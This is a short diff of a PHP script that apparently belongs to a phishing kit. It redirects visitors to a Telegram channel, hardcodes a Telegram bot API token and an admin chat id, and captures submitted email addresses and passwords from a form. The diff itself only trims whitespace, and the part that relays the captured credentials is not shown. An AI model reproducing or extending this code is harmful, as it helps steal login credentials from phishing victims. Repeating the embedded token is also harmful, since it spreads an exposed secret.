@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://t.me/TeamKeK ');
-$API_KEY = "1210963661:AAEV5jIMkx_US5qxWp827bWJwJBiPRr0WJ8"; 
+$API_KEY = "1210963661:AAEV5jIMkx_US5qxWp827bWJwJBiPRr0WJ8";
 $admin =385644809;
 $user = $_POST['email'];
 $pass = $_POST['pass'];
